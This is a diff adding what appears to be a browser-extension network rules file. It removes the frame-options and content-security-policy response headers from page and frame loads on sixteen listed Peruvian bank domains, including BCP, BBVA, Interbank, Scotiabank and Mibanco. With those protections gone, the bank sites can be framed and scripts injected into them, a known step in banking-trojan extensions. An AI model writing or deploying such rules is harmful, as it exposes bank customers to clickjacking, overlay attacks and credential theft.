@@ -1,0 +1,36 @@
+[
+  {
+    "id": 1,
+    "priority": 1,
+    "action": {
+      "type": "modifyHeaders",
+      "responseHeaders": [
+        { "header": "x-frame-options", "operation": "remove" },
+        { "header": "content-security-policy", "operation": "remove" },
+        { "header": "content-security-policy-report-only", "operation": "remove" },
+        { "header": "frame-options", "operation": "remove" }
+      ]
+    },
+    "condition": {
+      "requestDomains": [
+        "viabcp.com",
+        "tlcbcp.com",
+        "bcp.com.pe",
+        "bbva.pe",
+        "bbva.com",
+        "interbank.pe",
+        "interbank.com.pe",
+        "scotiabank.com.pe",
+        "scotiabankperu.com",
+        "banbif.com.pe",
+        "pichincha.pe",
+        "bancopichincha.pe",
+        "bn.com.pe",
+        "mibanco.com.pe",
+        "caja-huancayo.com.pe",
+        "cajaarequipa.pe"
+      ],
+      "resourceTypes": ["main_frame", "sub_frame"]
+    }
+  }
+]
